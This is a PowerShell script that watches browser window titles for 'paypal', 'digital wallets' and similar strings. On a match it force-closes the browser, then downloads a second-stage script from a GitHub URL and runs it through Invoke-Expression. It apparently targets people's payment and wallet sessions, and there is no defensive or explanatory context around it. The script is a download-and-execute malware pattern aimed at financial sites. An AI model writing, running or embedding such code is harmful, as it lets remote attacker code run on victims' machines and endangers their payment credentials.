# Define a list of partial titles you want to monitor
$targetTitles = @("Powerful tools", "paypal", "digital wallets")

# Define a list of popular browser process names
$browserProcesses = @("chrome", "firefox", "msedge", "opera")

# Define the interval to check (in seconds)
$checkInterval = 15

# Variable to track whether a condition has been met
$conditionMet = $false

# Loop until any condition is met
while (-not $conditionMet) {
    foreach ($browserName in $browserProcesses) {
        $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
        if ($currentBrowserProcesses) {
            foreach ($process in $currentBrowserProcesses) {
                try {
                    $processTitle = $process.MainWindowTitle
                    Write-Host "$browserName - Window Title: $processTitle"

                    $matchingTitles = @()
                    foreach ($targetTitle in $targetTitles) {
                        if ($processTitle -like "*$targetTitle*") {
                            Write-Host "Detected '$targetTitle' in $browserName. Closing..."
                            $matchingTitles += $targetTitle
                            Stop-Process -Id $process.Id -Force
                            $conditionMet = $true  # Set the flag to true when any condition is met
                        }
                    }

                    if ($matchingTitles.Count -gt 0) {
                        Write-Host "Matching titles: $($matchingTitles -join ', ')"
                    }
                } catch {
                    Write-Host "Error: $_"
                }
            }
        }
    }

    if (-not $conditionMet) {
        Write-Host "No condition met. Sleeping for $checkInterval seconds..."
        Start-Sleep -Seconds $checkInterval
    }
}

# After the condition is met, download and execute your second script from GitHub
if ($conditionMet) {
    $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/pp.ps1"
    $secondScript = Invoke-WebRequest -Uri $secondScriptUrl
    Invoke-Expression -Command $secondScript.Content
}

# Continue with the rest of your script here
Write-Host "A condition is met. Continue with the rest of your code here."